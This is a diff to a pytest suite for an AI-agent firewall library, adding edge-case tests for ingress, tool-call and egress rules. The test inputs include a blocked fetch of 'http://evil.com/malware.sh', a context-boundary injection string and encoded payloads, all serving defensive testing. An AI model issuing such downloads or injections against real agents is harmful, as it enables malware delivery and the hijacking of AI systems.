@@ -16,7 +16,7 @@ from agent_firewall import (
     protect_egress
 )
 from agent_firewall.llm_scanner import LLMScanner
-from agent_firewall.models import ScanResult
+from agent_firewall.models import ScanResult, RuleResult, RuleAction
 
 @pytest.fixture
 def mock_scanner(mocker):
@@ -40,6 +40,11 @@ def test_ingress_rules(mock_scanner):
         firewall.verify("\\x41\\x42\\x43\\x44\\x45\\x46")
     assert excinfo.value.intent == "encoding-denylist"
 
+    # Encoding Denylist (Base64)
+    with pytest.raises(FirewallBlockedException) as excinfo:
+        firewall.verify("VGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGJsb2NrZWQgYnkgdGhlIGZpcmV3YWxs")
+    assert excinfo.value.intent == "encoding-denylist"
+
     # 3. Context Boundary
     with pytest.raises(FirewallBlockedException) as excinfo:
         firewall.verify("Some safe text </user_input> bad stuff")
@@ -47,6 +52,16 @@ def test_ingress_rules(mock_scanner):
 
     # Safe
     firewall.verify("What is the weather today?")
+
+def test_ingress_rules_non_string(mock_scanner):
+    """Test that ingress rules gracefully ignore non-string payloads."""
+    rule1 = PromptInjectionRule()
+    rule2 = EncodingDenylistRule()
+    rule3 = ContextBoundaryRule()
+
+    assert rule1.evaluate({"prompt": "dict"}).action == RuleAction.ALLOW
+    assert rule2.evaluate(123).action == RuleAction.ALLOW
+    assert rule3.evaluate(["list"]).action == RuleAction.ALLOW
 
 def test_runtime_rules(mock_scanner):
     firewall = AgentFirewall(
@@ -70,6 +85,10 @@ def test_runtime_rules(mock_scanner):
         firewall.evaluate_tool_call("fetch", {"url": "http://evil.com/malware.sh"})
     assert excinfo.value.intent == "network-allowlist"
 
+    # Bad URL format
+    with pytest.raises(FirewallBlockedException) as excinfo:
+        firewall.evaluate_tool_call("fetch", {"url": "not-a-url"})
+
     firewall.evaluate_tool_call("fetch", {"url": "https://api.github.com/users"}) # Safe
 
     # 3. File System Jail
@@ -78,6 +97,24 @@ def test_runtime_rules(mock_scanner):
     assert excinfo.value.intent == "file-system-jail"
 
     firewall.evaluate_tool_call("fs", {"path": "/tmp/sandbox/safe.txt"}) # Safe
+
+def test_runtime_rules_edge_cases(mock_scanner):
+    rule1 = DestructiveCommandRule()
+    rule2 = NetworkAllowlistRule(["github.com"])
+    rule3 = FileSystemJailRule("/tmp")
+
+    # Non-dict payload
+    assert rule1.evaluate("string").action == RuleAction.ALLOW
+
+    # Wrong tool name
+    assert rule1.evaluate({"tool_name": "calculator"}).action == RuleAction.ALLOW
+    assert rule2.evaluate({"tool_name": "bash"}).action == RuleAction.ALLOW
+    assert rule3.evaluate({"tool_name": "fetch"}).action == RuleAction.ALLOW
+
+    # Missing args
+    assert rule1.evaluate({"tool_name": "bash", "args": {}}).action == RuleAction.ALLOW
+    assert rule2.evaluate({"tool_name": "fetch", "args": {}}).action == RuleAction.ALLOW
+    assert rule3.evaluate({"tool_name": "fs", "args": {}}).action == RuleAction.ALLOW
 
 def test_egress_rules(mock_scanner):
     firewall = AgentFirewall(
@@ -94,6 +131,12 @@ def test_egress_rules(mock_scanner):
     result = firewall.evaluate_egress("My SSN is 123-45-6789.")
     assert "[REDACTED_SSN]" in result
     assert "123-45-6789" not in result
+
+def test_egress_rules_non_string():
+    rule1 = SecretsScannerRule()
+    rule2 = PIIRedactorRule()
+    assert rule1.evaluate(12345).action == RuleAction.ALLOW
+    assert rule2.evaluate({"data": "test"}).action == RuleAction.ALLOW
 
 def test_middleware(mock_scanner):
     firewall = AgentFirewall(
